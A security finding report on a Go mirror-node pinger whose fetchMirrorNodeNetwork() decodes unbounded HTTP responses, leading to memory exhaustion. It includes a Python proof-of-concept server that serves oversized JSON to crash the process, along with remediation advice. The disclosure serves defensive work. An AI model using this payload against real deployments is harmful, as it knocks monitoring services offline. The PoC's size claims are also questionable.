### Title
Unbounded Mirror-Node Response Body Causes Memory Exhaustion in `fetchMirrorNodeNetwork()`

### Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` decodes the HTTP response body from the configured mirror node with no body-size cap and no field-length validation. An attacker who controls the mirror node response (via compromise, MITM on a plain-HTTP deployment, or DNS poisoning) can return a crafted JSON payload with arbitrarily long `ip_address_v4` strings across many nodes and endpoints, causing unbounded heap allocation and OOM-killing the pinger process.

### Finding Description

**Exact code path:**

`pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork()`, lines 95–124.

```
// line 95-98 — no io.LimitReader, body read is unbounded
var payload nodesEnvelope
if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
    return nil, false, fmt.Errorf("decode mirror nodes: %w", err)
}

// lines 113-123 — no length check on IPAddressV4
for _, ep := range n.ServiceEndpoints {
    host := strings.TrimSpace(ep.DomainName)
    if host == "" {
        host = strings.TrimSpace(ep.IPAddressV4)   // ← arbitrary-length string
    }
    if host == "" || ep.Port == 0 {
        continue
    }
    addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))  // ← O(n) alloc
    network[addr] = nodeAccountId                                // ← stored in map
}
```

**Root cause / failed assumption:** The code assumes the mirror node is trusted and returns reasonably-sized data. There is no `io.LimitReader` wrapping `resp.Body` before passing it to `json.NewDecoder` (line 96), and the `serviceEndpoint.IPAddressV4` field (line 32) is an unconstrained `string`. The only guard is `cfg.mirrorNodeClientTimeout` (default 10 s), which limits *time* but not *bytes*: a fast server can stream gigabytes within that window.

**Exploit flow:**
1. Attacker serves a crafted JSON response from the mirror node endpoint.
2. Response contains a `nodes` array with thousands of entries; each entry's `service_endpoints` contains entries with `ip_address_v4` set to a multi-megabyte string of digits and dots.
3. `json.NewDecoder(...).Decode(&payload)` allocates all strings into the Go heap with no limit.
4. `strings.TrimSpace` (O(n)), `net.JoinHostPort` (O(n)), and map-key hashing (O(n)) are each called per endpoint, multiplying CPU and memory pressure.
5. The process exhausts available memory and is OOM-killed.

**Why existing checks are insufficient:**
- `http.Client{Timeout: cfg.mirrorNodeClientTimeout}` — enforces a wall-clock deadline, not a byte limit. A local or fast-network attacker saturates the pipe within the timeout.
- HTTP status check (lines 90–93) — only rejects non-2xx; a 200 response with a huge body passes through.
- `if host == "" || ep.Port == 0` (line 118) — skips empty hosts but does not bound non-empty ones.
- No `net.ParseIP` or regex validation of `IPAddressV4` is performed anywhere.

### Impact Explanation
The pinger is a liveness/readiness-critical component: `main.go` writes `/tmp/ready` and `/tmp/alive` to signal Kubernetes probes (lines 36, 47). An OOM-killed pinger causes the pod to restart, disrupting the heartbeat and triggering false liveness failures. In a deployment where the pinger monitors mainnet/testnet health, repeated crashes degrade observability of the entire network. The severity is elevated because the attack is triggered by a single HTTP response with no further interaction required.

### Likelihood Explanation
**Precondition:** The attacker must control what the mirror node returns. This is achievable via:
- Compromise of the mirror node itself (realistic for `network=other` internal deployments).
- MITM on a plain-HTTP deployment (`http://mirror-rest:5551` is the documented example in `config.go` line 37); no TLS is enforced.
- DNS poisoning of the mirror node hostname.

**Feasibility:** Crafting the payload requires no special privileges — a standard HTTP server returning a large JSON body suffices. The attack is repeatable on every startup or reconnect cycle (the retry loop in `buildNetworkFromMirrorNodes` lines 52–69 re-invokes `fetchMirrorNodeNetwork` up to `mirrorNodeClientMaxRetries+1` times, each time re-reading the full body).

### Recommendation
1. **Wrap the response body with `io.LimitReader`** before decoding, e.g.:
   ```go
   const maxBodyBytes = 10 * 1024 * 1024 // 10 MB
   limited := io.LimitReader(resp.Body, maxBodyBytes)
   if err := json.NewDecoder(limited).Decode(&payload); err != nil { ... }
   ```
2. **Validate `IPAddressV4` format** after parsing: use `net.ParseIP` and reject strings that do not parse as a valid IPv4 address.
3. **Cap the number of nodes and endpoints** accepted from a single response (e.g., reject payloads with more than a few hundred nodes).
4. **Enforce TLS** for the mirror node REST URL in production deployments to eliminate MITM as an attack vector.

### Proof of Concept
```python
# Serve this JSON from a local HTTP server pointed to by HIERO_MIRROR_PINGER_REST
import json, http.server, socketserver

LONG_IP = "1" * 10_000_000  # 10 MB string

payload = {
    "nodes": [
        {
            "node_account_id": f"0.0.{i}",
            "service_endpoints": [
                {"ip_address_v4": LONG_IP, "domain_name": "", "port": 50211}
                for _ in range(100)
            ],
            "grpc_proxy_endpoint": None
        }
        for i in range(3, 103)  # 100 nodes × 100 endpoints = 10,000 entries
    ],
    "links": {"next": None}
}

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps(payload).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

with socketserver.TCPServer(("", 5551), Handler) as s:
    s.serve_forever()
```
Run the pinger with `HIERO_MIRROR_PINGER_NETWORK=other HIERO_MIRROR_PINGER_REST=http://127.0.0.1:5551`. The process allocates ~100 GB of heap (100 nodes × 100 endpoints × 10 MB per string) and is OOM-killed before `buildNetworkFromMirrorNodes` returns. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)
